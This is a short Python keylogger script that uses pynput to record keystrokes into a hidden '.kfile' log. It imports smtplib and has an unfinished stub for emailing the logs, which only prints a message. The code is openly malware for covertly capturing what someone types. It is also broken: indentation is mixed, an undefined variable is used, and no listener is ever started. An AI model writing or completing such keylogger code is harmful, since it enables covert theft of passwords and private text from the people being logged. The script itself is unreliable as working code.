import os,logging,smtplib,datetime as dt,threading,time
from pynput import keyboard

kfile=os.path.join(os.path.dirname(os.path.abspath(__file__)),'.kfile')		# ok
#kfile=os.path.join(os.getcwd(),'.kfile')                                 # ok

class KeyLogger:
	def __init__(self,interval=60):    # default interval is 60 seconds
			self.interval=dt.timedelta(seconds=interval)

	def captureKey(self):
		try:
      ckey=str(key.char)
    except AttributeError:
      if ckey==key.space:
        ckey=" "
      else:
        ckey=" "+str(key)+" "
    logging.basicConfig(filename=(kfile),level=logging.DEBUG,format='%(asctime)s \t %(message)s')
    logging.info(str(ckey))

	def logfile(self):
		if not os.path.exists(kfile):
			with open(kfile, 'w+'): pass    # create a new file if not exists

	def sendlog(self):
		msg=self.createmessage(kfile)
		print(msg)

	def createmessage(self,logfile):
		msg='Sending keylogger logs by email'
		return msg

def klog():
	kl=KeyLogger()
	kl.logfile()
	kl.captureKey()

if __name__=='__main__':
	klog()
